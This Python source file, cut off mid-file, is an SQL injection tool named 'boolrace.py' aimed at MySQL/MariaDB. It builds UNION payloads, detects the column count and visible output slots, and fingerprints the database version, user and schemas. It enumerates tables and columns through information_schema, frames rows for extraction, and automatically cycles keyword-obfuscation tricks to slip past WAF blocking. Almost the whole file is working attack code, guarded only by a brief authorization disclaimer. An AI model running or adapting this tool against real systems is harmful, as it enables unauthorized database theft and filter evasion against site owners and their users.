#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
boolrace.py — v0.1.0 experimental UNION-channel research tool (Python 3.10+).

Use only with explicit authorization. No completeness, snapshot consistency,
performance, or lossless binary-conversion guarantee is made.

Stages: probe, fingerprint, enumerate, extract, verify, all.
--dry-run reads configuration and prints stage/table intent only; it does not
construct an engine, discover SQL, contact a target, or write output files.
Column mode and generated Markdown/JSON reports are unsupported. Stage JSON
artifacts remain available. CRC32 sums are non-cryptographic checks, not proof
of integrity or row order. Use static fixtures for experimental evaluation.
Metadata enumeration retains the empty/NULL end sentinel convention; a target
that renders missing values ambiguously cannot establish completeness. Query
errors and exhausted schema/table/column limits (30/200/100) fail closed; even
exactly that many entries require an end sentinel within the existing budget.

Example: python boolrace.py all --config cfg.lab.json --dry-run
"""

import argparse
import base64
import gzip
import hashlib
import http.client
import json
import os
import re
import struct
import sys
import threading
import time
import urllib.parse
import urllib.request
import urllib.error
import zlib
from concurrent.futures import ThreadPoolExecutor


# ============================================================ 設定
DEFAULT_CONFIG = {
    "target": {
        "base_url": "http://127.0.0.1:8099/item.php?id=",
        "method": "GET",
        "headers": {"User-Agent": "boolrace/0.1.0-experimental"},
        "timeout": 60,
        "verify_tls": True,
        # Reuse TCP connections; performance depends on the target and workload.
        "keepalive": True,
    },
    "injection": {
        "prefix": "",              # 注入點前面的固定部分，例如 "-1' "
        "suffix": "-- -",          # 註釋掉原查詢剩餘部分
        "union_template": "{prefix}UNION SELECT {cols}{suffix}",
        "keyword_obfuscation": None,   # None | "mysql_version_comment"
        "ncols": None,             # None = 自動偵測
        "max_ncols": 20,
    },
    "slots": {
        # 槽位代號 -> 從 HTTP 回應抽值的正則（第 group 個捕獲）
        "definitions": {
            "title": {"regex": r"<title>(.*?)</title>", "group": 1, "index": 0},
            "p1":    {"regex": r"<p>(.*?)</p>", "group": 1, "index": 0},
            "p2":    {"regex": r"<p>(.*?)</p>", "group": 1, "index": 1},
            "p3":    {"regex": r"<p>(.*?)</p>", "group": 1, "index": 2},
            "p4":    {"regex": r"<p>(.*?)</p>", "group": 1, "index": 3},
            "p5":    {"regex": r"<p>(.*?)</p>", "group": 1, "index": 4},
            "p6":    {"regex": r"<p>(.*?)</p>", "group": 1, "index": 5},
            "p7":    {"regex": r"<p>(.*?)</p>", "group": 1, "index": 6},
            # 屬性樣式：值在 HTML 屬性裡（注意瀏覽器/伺服器會做實體編碼）
            "attr1": {"regex": r'data-name="([^"]*)"', "group": 1, "index": 0},
            # JSON 樣式：kind=json 時用 path 取值
            "jname": {"kind": "json", "path": "name"},
        },
        # 探測時依序嘗試填入「標記字串」，看哪個槽會顯示出來
        "probe_order": ["title", "p1", "p2", "p3", "p4", "p5", "p6", "p7"],
    },
    "extraction": {
        # union | compress | sliced | slices; column is disabled (row alignment).
        "mode": "union",
        "row_sep": "\x1f",         # 欄位分隔
        "chunk": 300000,           # compress 模式每槽每段字元
        # Concurrent requests; keep load within the authorized test scope.
        "workers": 1,
        "throttle": 0.15,
        "null_marker": "\x00NULL\x00",
        "decode_html_entities": True,
    },
    "tables": {},
    "output": {"dir": "./boolrace_out"},
}


def validate_mode(mode):
    if mode == "column":
        raise ValueError("unsupported experimental column mode: independent column "
                         "queries cannot guarantee row alignment or a snapshot")
    if mode not in ("union", "compress", "sliced", "slices"):
        raise ValueError("unsupported extraction mode: %r" % mode)


def deep_merge(base, over):
    out = dict(base)
    for k, v in over.items():
        if k in out and isinstance(out[k], dict) and isinstance(v, dict):
            out[k] = deep_merge(out[k], v)
        else:
            out[k] = v
    return out


# ============================================================ 混淆策略
# 每種策略都只改變「看起來」的字面，不改變 MySQL 執行語義。
OBFUSCATIONS = {
    # /*!50000UNION*/ —— MySQL 版本註釋，語義完全相同
    "mysql_version_comment": lambda q: _kw_comment(q, ("UNION","SELECT","FROM","WHERE")),
    # union/**/select —— 中間插空註釋，打斷 "union select" 這種連續字串
    "inline_comment": lambda q: re.sub(
        r"\bUNION\b(\s+)\bSELECT\b", "UNION/**/SELECT", q, flags=re.I),
    # un/**/ion sel/**/ect —— 更細的切法
    "split_keyword": lambda q: re.sub(
        r"\bUNION\b(\s+)\bSELECT\b", "un/**/ion sel/**/ect", q, flags=re.I),
    # 換行 / TAB 取代空白
    "whitespace": lambda q: re.sub(
        r"\bUNION\b(\s+)\bSELECT\b", "UNION%0aSELECT", q, flags=re.I),
}

def _kw_comment(q, kws):
    for kw in kws:
        q = re.sub(r"(?<![/*!\d])\b%s\b" % kw, "/*!50000%s*/" % kw, q, flags=re.I)
    return q

def _obfuscate(q, mode):
    fn = OBFUSCATIONS.get(mode)
    return fn(q) if fn else q


# ============================================================ 例外
def safe_decode(body, label="", on_binary="hex"):
    """把位元組解成文字；遇到無法解碼的二進位資料時，明確降級而不是崩潰。

    資料庫可能包含 BINARY/BLOB；此文字降級表示不保證可逆。
    整批資料因為一個 0xFF 就丟掉，是最沒用的行為。
    寧可把那一欄轉成 hex，也要把其餘的資料帶回來。
    """
    try:
        return body.decode("utf-8"), False
    except UnicodeDecodeError:
        if on_binary == "strict":
            raise SilentFailure(
                "response for %s contains non-UTF-8 bytes (binary column). "
                "Set extraction.on_binary='hex' to carry it as hex, or "
                "exclude the binary column from the projection." % (label or "table"))
        # 逐位元組：合法 UTF-8 保留，非法位元組轉成 \xNN
        out = []
        i = 0
        n = len(body)
        while i < n:
            b = body[i]
            if b < 0x80:
                out.append(chr(b))
                i += 1
                continue
            # 嘗試多byte序列
            for ln in (2, 3, 4):
                chunk = body[i:i + ln]
                if len(chunk) == ln:
                    try:
                        out.append(chunk.decode("utf-8"))
                        i += ln
                        break
                    except UnicodeDecodeError:
                        continue
            else:
                # 非法的二進位位元組：用 \u00NN 表示。
                # 不能用 \xNN —— JSON 沒有 \x 轉義，會讓整個文件解析失敗。
                out.append("\\u%04x" % b)
                i += 1
        return "".join(out), True


class ChannelError(Exception):
    """通道本身的問題（連不上、被擋）——重試可能有用。"""


class QueryError(Exception):
    """查詢語法或權限問題——重試沒用，要改查詢。"""


class SilentFailure(Exception):
    """最危險：HTTP 200 但語義錯誤。必須立刻停止，不能猜。"""


# ============================================================ HTTP
class Transport:
    """HTTP transport with per-thread connection reuse; no throughput guarantee."""

    def __init__(self, cfg):
        t = cfg["target"]
        self.url = t["base_url"]
        self.headers = dict(t.get("headers") or {})
        self.timeout = t.get("timeout", 60)
        self.verify = t.get("verify_tls", True)
        self.keepalive = t.get("keepalive", True)
        self.stats = {"req": 0, "bytes": 0, "406": 0, "429": 0, "err": 0}
        # 406 通常是 WAF 的「永久性」拒絕，不是暫時性錯誤。
        # 對它做指數退避只會讓程式掛住，所以單獨限制重試次數。
        self.block_retries = t.get("block_retries", 1)
        self.block_backoff = t.get("block_backoff", 1.0)
        self.blocked_hint = None
        self._lock = threading.Lock()
        self._local = threading.local()
        self._connections = set()

        self._tls = None
        if not self.verify:
            import ssl
            self._tls = ssl._create_unverified_context()

        u = urllib.parse.urlsplit(self.url or "")
        self._scheme = u.scheme or "http"
        self._host = u.hostname or "127.0.0.1"
        self._port = u.port or (443 if self._scheme == "https" else 80)
        self._path = u.path or "/"
        if u.query:
            self._path += "?" + u.query
        # 只有標準 http/https 才能自己管連線；其餘（少見的 handler）走 urllib
        self._direct = self._scheme in ("http", "https")

    # ---------------------------------------------------------- 連線管理
    def _conn(self):
        c = getattr(self._local, "conn", None)
        if c is None:
            if self._scheme == "https":
                c = http.client.HTTPSConnection(
                    self._host, self._port, timeout=self.timeout, context=self._tls)
            else:
                c = http.client.HTTPConnection(
                    self._host, self._port, timeout=self.timeout)
            self._local.conn = c
            with self._lock:
                self._connections.add(c)
        return c

    def _drop_conn(self):
        c = getattr(self._local, "conn", None)
        if c is not None:
            try:
                c.close()
            except Exception:
                pass
            self._local.conn = None
            with self._lock:
                self._connections.discard(c)

    def close(self):
        self._close_pool()
        self._drop_conn()
        with self._lock:
            connections = list(self._connections)
            self._connections.clear()
        for connection in connections:
            connection.close()

    def _raw_get(self, path):
        """單次 GET，回傳 (status, body, headers)。盡量重用連線。

        path 是「相對於 base_url 路徑」的完整路徑，呼叫端負責接好。
        """
        if not self._direct:
            req = urllib.request.Request(self.url + path, headers=self.headers)
            with urllib.request.urlopen(req, timeout=self.timeout,
                                        context=self._tls) as r:
                return r.status, r.read(), r.headers

        hdrs = dict(self.headers)
        if self.keepalive:
            hdrs.setdefault("Connection", "keep-alive")
        else:
            hdrs["Connection"] = "close"

        for attempt in (0, 1):
            c = self._conn()
            try:
                c.request("GET", path, headers=hdrs)
                r = c.getresponse()
                body = r.read()
                if r.will_close or not self.keepalive:
                    self._drop_conn()
                return r.status, body, r.headers
            except (http.client.HTTPException, OSError):
                # 連線被對端關掉（keep-alive 逾時、代理重置、伺服器重啟）。
                # 換一條新連線重試一次，這不是協定錯誤。
                self._drop_conn()
                if attempt == 1:
                    raise

    # ---------------------------------------------------------- 對外
    def get(self, payload, retries=5):
        # base_url 帶的路徑（含 id=）必須保留，只把 payload 接在後面。
        # 之前直接 c.request("GET", payload) 把路徑吃掉了，
        # 導致每個請求都打到 "/" -> 探測完全失敗。
        path = self._path + urllib.parse.quote(payload, safe="")
        last = None
        blocked = 0
        for attempt in range(retries):
            try:
                t0 = time.perf_counter()
                status, body, hdrs = self._raw_get(path)
                dt = time.perf_counter() - t0
                with self._lock:
                    self.stats["req"] += 1
                    self.stats["bytes"] += len(body)
                    if status == 406:
                        self.stats["406"] += 1
                if status in (301, 302, 303, 307, 308):
                    loc = hdrs.get("Location") if hdrs else None
                    if loc and attempt < retries - 1:
                        u2 = urllib.parse.urlsplit(loc)
                        newp = u2.path or "/"
                        if u2.query:
                            newp += "?" + u2.query
                        # 只影響這條執行緒，不動共享狀態
                        path = newp + urllib.parse.quote(payload, safe="")
                        continue
                if status == 429:
                    # 429 才是真正的暫時性限流：尊重 Retry-After
                    ra = 1.0
                    try:
                        ra = float((hdrs.get("Retry-After") if hdrs else None) or 1)
                    except Exception:
                        pass
                    with self._lock:
                        self.stats.setdefault("429", 0)
                        self.stats["429"] += 1
                    if attempt < retries - 1:
                        time.sleep(min(ra, 30))
                        continue
                    return status, body, dt
                if status == 406:
                    blocked += 1
                    self.blocked_hint = body[:200]
                    if blocked > self.block_retries:
                        raise ChannelError(
                            "406 blocked %d× — the payload is being filtered, "
                            "not throttled. Change keyword_obfuscation or "
                            "encoding instead of retrying." % blocked)
                    time.sleep(self.block_backoff)
                    continue
                return status, body, dt
            except urllib.error.HTTPError as e:
                body = e.read() if hasattr(e, "read") else b""
                if e.code == 429:
                    ra = 1.0
                    try:
                        ra = float(dict(e.headers).get("Retry-After", 1))
                    except Exception:
                        pass
                    with self._lock:
                        self.stats.setdefault("429", 0)
                        self.stats["429"] += 1
                    time.sleep(min(ra, 30))
                    continue
                if e.code == 406:
                    with self._lock:
                        self.stats["406"] += 1
                    blocked += 1
                    self.blocked_hint = body[:200]
                    last = ChannelError("406 blocked")
                    if blocked > self.block_retries:
                        raise ChannelError(
                            "406 blocked %d× — payload is filtered, not throttled"
                            % blocked)
                    time.sleep(self.block_backoff)
                    continue
                return e.code, body, 0.0
            except Exception as e:
                last = e
                with self._lock:
                    self.stats["err"] += 1
                time.sleep(min(2 ** attempt, 10))
        raise ChannelError("give up after %d tries: %s" % (retries, last))

    def _pool(self, workers):
        """全 process 共用一個池。

        教訓：不要在池裡的任務中再開池。sliced 模式本來是「外層 32 個
        切片 + 每片內層 32 個分段」，兩層一乘就是 265 條執行緒，
        結果有請求被擠掉、資料短少，CRC 才發現。
        此池的 max_workers 限制池內併發數；不保證效能或資料一致性。
        """
        workers = max(1, int(workers or 1))
        if getattr(self, "_pool_obj", None) is None or \
                self._pool_obj[0] != workers:
            self._close_pool()
            self._pool_obj = (workers,
                              ThreadPoolExecutor(max_workers=workers))
        return self._pool_obj[1]

    def _close_pool(self):
        p = getattr(self, "_pool_obj", None)
        if p is not None:
            try:
                p[1].shutdown(wait=True)
            except Exception:
                pass
            self._pool_obj = None

    def get_many(self, payloads, workers=1, throttle=0.0):
        """平行送多個 payload，回傳順序與輸入相同的結果清單。

        順序很重要：分段抽取靠順序拼接 base64，
        亂序就整包解不開。executor.map 保證順序。
        """
        workers = max(1, int(workers or 1))
        # 如果呼叫端本身就在這個池的執行緒裡（巢狀），再丟進同一個池
        # 會排隊等自己 -> 死鎖。這種情況直接序列處理。
        if getattr(self._local, "in_pool", False):
            workers = 1
        if workers == 1:
            out = []
            for p in payloads:
                out.append(self.get(p))
                if throttle:
                    time.sleep(throttle)
            return out

        def one(p):
            self._local.in_pool = True
            try:
                return self.get(p)
            finally:
                self._local.in_pool = False
                if throttle:
                    time.sleep(throttle)

        return list(self._pool(workers).map(one, payloads))

    def curl_stats(self):
        return dict(self.stats)


# ============================================================ 槽位解析
class SlotParser:
    def __init__(self, cfg):
        self.defs = cfg["slots"]["definitions"]
        self.order = cfg["slots"]["probe_order"]
        self.decode_entities = cfg["extraction"].get("decode_html_entities", True)

    def _unescape(self, s):
        if not self.decode_entities:
            return s
        for a, b in (("&amp;", "&"), ("&lt;", "<"), ("&gt;", ">"),
                     ("&quot;", '"'), ("&#039;", "'"), ("&#39;", "'")):
            s = s.replace(a, b)
        return s

    def extract(self, name, text):
        d = self.defs.get(name)
        if not d:
            return None
        kind = d.get("kind", "regex")

        # JSON 回應：用點路徑取值，例如 "name" 或 "data.0.name"
        if kind == "json":
            try:
                obj = json.loads(text)
            except Exception:
                return None
            cur = obj
            for part in str(d.get("path", "")).split("."):
                if part == "":
                    continue
                if isinstance(cur, list):
                    cur = cur[int(part)]
                elif isinstance(cur, dict):
                    cur = cur.get(part)
                else:
                    return None
                if cur is None:
                    return None
            return str(cur)

        # 預設：正則
        ms = re.findall(d["regex"], text, re.S)
        i = d.get("index", 0)
        if len(ms) <= i:
            return None
        v = ms[i]
        if isinstance(v, tuple):
            v = v[d.get("group", 1) - 1]
        return self._unescape(v.strip())

    def extract_all(self, text):
        return {n: self.extract(n, text) for n in self.order}


# ============================================================ 引擎
class Engine:
    def __init__(self, cfg):
        self.cfg = cfg
        self.tp = Transport(cfg)
        self.sp = SlotParser(cfg)
        self.ncols = cfg["injection"].get("ncols")
        self.slots = []          # 實際可用的槽位名稱（依位置排序）
        self.slot_pos = {}       # 槽位名 -> UNION 欄位位置(1-based)
        self.profile = {}
        self._server_cap_cache = None  # 單次聚合上限（group_concat_max_len）
        self._bin_cols_cache = {}

    # ---------------------------------------------------------- SQL 組裝
    def close(self):
        self.tp.close()

    def _kw(self, sql):
        """關鍵字混淆：把 UNION SELECT 換成 /*!50000UNION*/ /*!50000SELECT*/"""
        mode = self.cfg["injection"].get("keyword_obfuscation")
        if not mode:
            return sql
        return _obfuscate(sql, mode)

    def union_sql(self, exprs):
        """exprs: {slot_name: sql_expr}；其餘欄位填 1"""
        n = self.ncols
        cols = ["1"] * n
        for name, ex in exprs.items():
            pos = self.slot_pos[name]
            cols[pos - 1] = ex
        tpl = self.cfg["injection"]["union_template"]
        sql = tpl.format(
            prefix=self.cfg["injection"]["prefix"],
            cols=",".join(cols),
            suffix=self.cfg["injection"]["suffix"],
        )
        return self._kw(sql)

    # ---------------------------------------------------------- 單次取值
    def query(self, expr, slot=0, retries=3):
        """把 expr 放進某個可用槽，回傳它的字串值。"""
        if not self.slots:
            raise ChannelError("slots not discovered; run probe first")
        name = self.slots[slot] if isinstance(slot, int) else slot
        payload = self.union_sql({name: expr})
        status, body, dt = self.tp.get(payload)
        text = body.decode("utf-8", "replace")
        if status >= 500:
            m = re.search(r"(SQL syntax|Unknown column|denied|error)", text, re.I)
            raise QueryError("HTTP %d %s" % (status, m.group(1) if m else ""))
        v = self.sp.extract(name, text)
        if v is None:
            raise ChannelError("slot %s produced nothing" % name)
        return v, status, dt

    # ---------------------------------------------------------- probe
    def _probe_once(self):
        """跑一次欄位數 + 可見槽偵測；失敗會拋例外。"""
        j = self.cfg["injection"]
        # (a) 欄位數：逐漸增加，直到不出現「欄數不符」錯誤
        mark = "0x42524d41524b"      # 'BRMARK'
        found = None
        for n in range(1, j.get("max_ncols", 20) + 1):
            cols = ",".join([mark] + ["1"] * (n - 1))
            tpl = j["union_template"]
            sql = tpl.format(prefix=j["prefix"], cols=cols, suffix=j["suffix"])
            sql = self._kw(sql)
            try:
                status, body, dt = self.tp.get(sql)
            except ChannelError as e:
                if "406" in str(e):
                    raise ChannelError(
                        "column-count probe was blocked (406) at n=%d. "
                        "The UNION keyword itself is filtered. Try "
                        "keyword_obfuscation='mysql_version_comment'." % n)
                continue
            text = body.decode("utf-8", "replace")
            low = text.lower()
            if status < 500 and "different number of columns" not in low \
                    and "column" not in low.split("union")[0][:200]:
                found = n
                break
            time.sleep(0.05)
        if not found:
            raise ChannelError("could not determine column count")
        self.ncols = found

        # (b) 可見槽：每個位置填不同標記，看哪個顯示出來
        markers = {}
        cols = []
        for i in range(1, found + 1):
            m = "MRK%02d" % i
            markers[i] = m
            cols.append("0x" + m.encode().hex())
        tpl = j["union_template"]
        sql = self._kw(tpl.format(prefix=j["prefix"], cols=",".join(cols),
                                  suffix=j["suffix"]))
        status, body, dt = self.tp.get(sql)
        text = body.decode("utf-8", "replace")

        vis = []
        for i in range(1, found + 1):
            mk = markers[i]
            # 找出含有該標記的槽位
            for sname in self.sp.order:
                v = self.sp.extract(sname, text)
                if v and mk in v:
                    vis.append((i, sname))
                    break
        if not vis:
            # 自動探勘：回應不是預期的 HTML 時，找出標記實際落在哪裡。
            # 這樣 JSON 與 HTML 屬性格式不用手寫配置。
            auto = self._autodiscover(text, markers, found)
            if auto:
                sys.stderr.write(
                    "[probe] auto-discovered %d slot(s) from response shape\n"
                    % len(auto))
                vis = auto
        if not vis:
            raise SilentFailure(
                "no visible slot found. Marker %r never appeared. "
                "This usually means the page escapes our regex, or the "
                "UNION is being filtered. Read the raw body before concluding "
                "this is a blind-only target." % markers.get(1))

        self.slots = [s for _, s in vis]
        self.slot_pos = {s: p for p, s in vis}
        self.profile["ncols"] = found
        self.profile["slots"] = self.slots
        self.profile["slot_positions"] = self.slot_pos

        # (c) 關鍵：驗證槽位「能完整傳遞資料」。
        # 顯示層截斷（[:80]）、字元集轉換、HTML 壓縮都會讓標記出現，
        # 但長資料被切掉。只測短標記抓不到這個問題。
        self.profile["slot_capacity"] = self._probe_capacity()
        need = self.cfg["extraction"]["chunk"]
        caps = self.profile["slot_capacity"]
        if not caps or max(caps.values()) < 12:
            raise SilentFailure(
                "slot appears visible but cannot carry a measurable payload "
                "(max capacity %r chars). The page is truncating or mangling "
                "output. Extracted data would be silently incomplete."
                % (max(caps.values()) if caps else 0))
        if max(caps.values()) < need:
            self.profile["chunk_recommended"] = min(caps.values())
            sys.stderr.write(
                "[probe] WARNING: widest slot carries only %d chars "
                "(config chunk=%d). Auto-lowering chunk to stay safe.\n"
                % (min(caps.values()), need))
        return self.profile

    def _autodiscover(self, text, markers, found):
        """回應不是預期的 HTML 時，自動找出標記的位置並生成槽位定義。

        處理兩種常見變形：
          - JSON 回應：標記在 JSON 值裡 -> 生成 kind=json 槽位
          - 值在 HTML 屬性裡 -> 生成屬性正則

        找不到就回傳空清單，呼叫端會走原本的乾淨失敗路徑。
        """
        # (a) 是 JSON 嗎？
        stripped = text.strip()
        if stripped.startswith("{") or stripped.startswith("["):
            try:
                obj = json.loads(stripped)
            except Exception:
                obj = None
            if obj is not None:
                paths = self._json_paths(obj)
                for p in paths:
                    cur = self._json_get(obj, p)
                    if not isinstance(cur, str):
                        continue
                    for pos, mk in markers.items():
                        if mk in cur:
                            name = "j%d" % pos
                            self.sp.defs[name] = {"kind": "json", "path": p}
                            if name not in self.sp.order:
                                self.sp.order.append(name)
                            return [(pos, name)]

        # (b) 標記落在某個 HTML 屬性值裡嗎？
        for pos, mk in markers.items():
            # 找出包含標記的 "attr=value"
            m = re.search(r'([\w:-]+)\s*=\s*"[^"]*%s[^"]*"' % re.escape(mk), text)
            if not m:
                m = re.search(r"([\w:-]+)\s*=\s*'[^']*%s[^']*'" % re.escape(mk), text)
            if m:
                attr = m.group(1)
                name = "a%d" % pos
                # 生成能抓到該屬性值的正則
                rx = r'%s\s*=\s*"([^"]*)"' % re.escape(attr)
                self.sp.defs[name] = {"regex": rx, "group": 1, "index": 0}
                if name not in self.sp.order:
                    self.sp.order.append(name)
                return [(pos, name)]
        return []

    @staticmethod
    def _json_paths(obj, prefix=""):
        """列出 JSON 裡所有「值是字串」的點路徑。"""
        out = []
        if isinstance(obj, dict):
            for k, v in obj.items():
                p = k if not prefix else prefix + "." + k
                if isinstance(v, str):
                    out.append(p)
                elif isinstance(v, (dict, list)):
                    out.extend(Engine._json_paths(v, p))
        elif isinstance(obj, list):
            for i, v in enumerate(obj):
                p = str(i) if not prefix else prefix + "." + str(i)
                if isinstance(v, str):
                    out.append(p)
                elif isinstance(v, (dict, list)):
                    out.extend(Engine._json_paths(v, p))
        return out

    @staticmethod
    def _json_get(obj, path):
        cur = obj
        for part in path.split("."):
            if isinstance(cur, list):
                try:
                    cur = cur[int(part)]
                except Exception:
                    return None
            elif isinstance(cur, dict):
                cur = cur.get(part)
            else:
                return None
            if cur is None:
                return None
        return cur

    def _probe_capacity(self):
        """逐槽測量「能完整帶回多少字元」。

        兩個關鍵設計，都是被靶場打出來的：

        1. 用 REPEAT() 讓伺服器生成測試資料。
           字面量會讓 URL/payload 本身變長，撞到 request-line 上限，
           量到的是 URL 限制而不是回應截斷。

        2. 同一長度要重測。資料庫的暫存表可能偶發失敗
           （MariaDB: error 126 "Index is corrupted" for #sql-temptable），
           單次失敗若當成「這就是上限」，會嚴重低估容量。
           所以：失敗重試，連續失敗才算真的不行。
        """
        caps = {}
        ladders = (1024, 16384, 65536, 262144, 1048576, 4194304)
        for name in self.slots:
            best = 0
            for n in ladders:
                got = self._measure_once(name, n)
                if got is None:
                    break
                if got >= n * 0.95:
                    best = max(best, got)
                    continue
                if got > 0:
                    # 找到截斷點，在 (best, n) 之間二分收斂到更精確的值
                    lo, hi = best, n
                    for _ in range(4):
                        mid = (lo + hi) // 2
                        if mid <= lo:
                            break
                        g2 = self._measure_once(name, mid)
                        if g2 is None:
                            break
                        if g2 >= mid * 0.95:
                            lo = mid
                            best = max(best, g2)
                        else:
                            hi = g2 if g2 > 0 else mid
                    best = max(best, got)
                break
            caps[name] = best

        # Recheck smaller measurements; capacities may differ across slots.
        vals = [v for v in caps.values() if v > 0]
        if len(vals) > 1:
            top = max(vals)
            for k, v in list(caps.items()):
                if 0 < v < top:
                    # 驗證一次：是不是真的比較窄？
                    probe = self._measure_once(k, top)
                    if probe is not None and probe >= top * 0.95:
                        caps[k] = top
        return caps

    def _measure_once(self, name, n, tries=6):
        """送 REPEAT(marker, n)，回傳實際收到的字元數。

        這裡有兩個坑，都在靶場上踩到：

        1. MariaDB 對大 REPEAT 偶發 error 126 "Index is corrupted"
           for /tmp/#sql-temptable。這是伺服器端的暫存表問題，
           重試就好 —— 若當成「容量上限」，會把 4MB 誤判成 1KB。

        2. 槽位容量可能不同；測量結果不代表未來回應容量的保證。
        """
        ex = "REPEAT(0x51,%d)" % n        # 讓伺服器生成，payload 恆定很短
        for t in range(tries):
            try:
                payload = self.union_sql({name: ex})
                status, body, dt = self.tp.get(payload)
            except ChannelError:
                time.sleep(0.2 * (t + 1))
                continue
            if status >= 500:
                time.sleep(0.2 * (t + 1))
                continue
            text = body.decode("utf-8", "replace")
            v = self.sp.extract(name, text)
            if v is None:
                time.sleep(0.2 * (t + 1))
                continue
            return v.count("Q")
        return None

    def probe(self):
        """階段 1：找欄位數 + 找可見槽。
        若被 406 擋住，逐一實測混淆策略，採用第一個真的能過的。
        全部都過不了就乾淨地失敗——不假裝通道可用。"""
        try:
            return self._probe_once()
        except ChannelError as e:
            if "406" not in str(e):
                raise
            if self.cfg["injection"].get("keyword_obfuscation"):
                raise

        tried = []
        for mode in ("inline_comment", "split_keyword", "whitespace",
                     "mysql_version_comment"):
            self.cfg["injection"]["keyword_obfuscation"] = mode
            self.ncols = None
            self.slots, self.slot_pos = [], {}
            try:
                p = self._probe_once()
                sys.stderr.write("[probe] filter bypassed with %r\n" % mode)
                p["obfuscation"] = mode
                return p
            except ChannelError as e:
                tried.append("%s(%s)" % (mode, str(e)[:40]))
                continue
        self.cfg["injection"]["keyword_obfuscation"] = None
        raise ChannelError(
            "all obfuscation strategies were blocked: %s. "
            "The filter rejects the keyword outright — this endpoint needs a "
            "different technique (e.g. blind/time-based), not a UNION bypass."
            % "; ".join(tried))

    # ---------------------------------------------------------- fingerprint
    def fingerprint(self):
        checks = {
            "version": "VERSION()",
            "current_db": "DATABASE()",
            "current_user": "CURRENT_USER()",
            "charset": "@@character_set_database",
            "sql_mode": "@@sql_mode",
            "max_allowed_packet": "@@max_allowed_packet",
            "group_concat_max_len": "@@group_concat_max_len",
            "compress_ok": "LENGTH(COMPRESS(0x41424344))",
            "base64_ok": "LENGTH(TO_BASE64(0x41424344))",
            "jsonagg_ok": "LENGTH(JSON_ARRAYAGG(1)) IS NOT NULL",
            "regexp_ok": "1 REGEXP 0x31",
        }
        out = {}
        for k, ex in checks.items():
            try:
                v, _, _ = self.query(ex)
                out[k] = v
            except (QueryError, ChannelError) as e:
                out[k] = "ERR:%s" % str(e)[:40]
            time.sleep(0.05)
        # 資料庫清單（逐號列，避免 GROUP_CONCAT 的 1024 上限）
        dbs = []
        for i in range(30):
            v, _, _ = self.query(
                "(SELECT schema_name FROM information_schema.schemata LIMIT %d,1)" % i)
            if not v or v.upper() == "NULL":
                break
            dbs.append(v)
            time.sleep(0.05)
        else:
            raise SilentFailure("schema enumeration limit 30 reached without an end sentinel")
        out["databases"] = dbs
        self.profile.update(out)
        return out

    # ---------------------------------------------------------- 表/欄枚舉
    def list_tables(self, schema, limit=200):
        names = []
        for i in range(limit):
            ex = ("(SELECT table_name FROM information_schema.tables "
                  "WHERE table_schema=0x%s LIMIT %d,1)"
                  % (schema.encode().hex(), i))
            v, _, _ = self.query(ex)
            if not v or v.upper() == "NULL":
                break
            names.append(v)
            time.sleep(0.05)
        else:
            raise SilentFailure(
                "table enumeration limit %d reached for schema %r without an end sentinel"
                % (limit, schema))
        return names

    def list_columns(self, schema, table, limit=100):
        cols = []
        for i in range(limit):
            ex = ("(SELECT column_name FROM information_schema.columns "
                  "WHERE table_schema=0x%s AND table_name=0x%s LIMIT %d,1)"
                  % (schema.encode().hex(), table.encode().hex(), i))
            v, _, _ = self.query(ex)
            if not v or v.upper() == "NULL":
                break
            cols.append(v)
            time.sleep(0.05)
        else:
            raise SilentFailure(
                "column enumeration limit %d reached for %r.%r without an end sentinel"
                % (limit, schema, table))
        return cols

    # ---------------------------------------------------------- extract
    def _binary_cols(self, table, cols):
        """問 information_schema 哪些欄位是二進位型別。

        資料庫可能包含 BINARY/VARBINARY/BLOB。
        這些欄位不能當文字傳：位元組 0xFF 在 UTF-8 裡沒有等價字元，
        一旦「字元化」就永久失真，CRC 也對不回去。
        正確做法是在伺服器端就 HEX()，全程只傳 ASCII，位元組不丟。
        """
        key = (table, tuple(cols))
        if key in self._bin_cols_cache:
            return self._bin_cols_cache[key]
        found = set()
        try:
            db = self.cfg["target"].get("schema")
            ph = ",".join("'%s'" % c.replace("'", "''") for c in cols)
            ex = ("(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns "
                  "WHERE table_schema=%s AND table_name='%s' AND column_name IN (%s) "
                  "AND data_type IN ('binary','varbinary','blob','tinyblob',"
                  "'mediumblob','longblob','bit','geometry'))"
                  % ("'%s'" % db.replace("'", "''") if db else "DATABASE()",
                     table.replace("'", "''"), ph))
            v, _, _ = self.query(ex)
            if v:
                for c in v.split(","):
                    if c:
                        found.add(c.strip())
        except (QueryError, ChannelError, ValueError, TypeError) as e:
            raise SilentFailure("binary column metadata unavailable: %s" % e) from e
        self._bin_cols_cache[key] = found
        return found

    @staticmethod
    def _col_expr(c, nullm_hex, as_hex):
        """單一欄位的取值表達式；二進位欄位用 HEX() 保真。"""
        base = "`%s`" % c
        if as_hex:
            base = "HEX(%s)" % base
        return "IFNULL(%s,0x%s)" % (base, nullm_hex)

    def _agg_sql_framed(self, table, cols):
        """長度前綴編碼：每欄變成 "N:內容"；邊界由宣告長度決定。

        CONCAT_WS + 分隔符在真實資料上必然踩雷 —— 只要某欄的值剛好
        含有分隔符，整列就會被劈開（實測 edge_cases.has_sep = a\x1fb）。
        長度前綴不需要猜邊界，解碼時按長度精確切。

        格式：N1:v1|N2:v2|...  其中 | 只是外框分隔，安全因為 N 是十進位。
        """
        sep = self.cfg["extraction"]["row_sep"]
        nullm = self.cfg["extraction"]["null_marker"]
        bin_cols = self._binary_cols(table, cols)
        parts = []
        for c in cols:
            v = self._col_expr(c, nullm.encode().hex(), c in bin_cols)
            # 必須用 CHAR_LENGTH（字元數），不能用 LENGTH（位元組數）。
            # café 的 é 佔 2 bytes：LENGTH=15 但只有 12 個字元，
            # 按位元組前綴去切字元字串必然錯位。
            parts.append("CONCAT(CHAR_LENGTH(%s),0x3a,%s)" % (v, v))
        return "CONCAT_WS(0x%s,%s)" % (sep.encode().hex(), ",".join(parts))

    @staticmethod
    def _unframe_row(text, ncols, sep="\x1f"):
        """把長度前綴格式的一列切回欄位值。"""
        out, i, n = [], 0, len(text)
        for _ in range(ncols):
            j = text.find(":", i)
            if j < 0:
                return None
            prefix = text[i:j]
            if not re.fullmatch(r"[0-9]+", prefix):
                return None
            try:
                ln = int(prefix)
            except ValueError:
                return None
            end = j + 1 + ln
            if end > n:
                return None
            out.append(text[j + 1:end])
            i = end
            if _ < ncols - 1:
                if text[i:i + len(sep)] != sep:
                    return None
                i += len(sep)
        return out if i == n else None

